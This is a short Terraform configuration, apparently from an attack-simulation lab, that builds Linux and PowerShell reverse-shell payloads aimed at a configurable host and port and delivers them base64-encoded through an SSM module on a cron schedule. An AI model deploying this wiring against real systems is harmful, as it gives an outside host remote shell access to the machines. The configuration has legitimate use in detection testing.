###########################
# PAYLOAD 
###########################

module "payload" {
    source = "../../../../common/payloads/linux/modules/connect-reverse-shell"
    inputs = {
        environment     = var.environment
        deployment      = var.deployment
        tag             = var.tag
        host_ip         = var.host_ip
        host_port       = var.host_port
    }
}

module "powershell_payload" {
    source = "../../../../common/payloads/windows/modules/connect-reverse-shell"
    inputs = {
        environment     = var.environment
        deployment      = var.deployment
        tag             = var.tag
        host_ip         = var.host_ip
        host_port       = var.windows_host_port
    }
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = module.payload.outputs["base64_payload"]
    base64_powershell_payload  = module.powershell_payload.outputs["base64_payload"]
}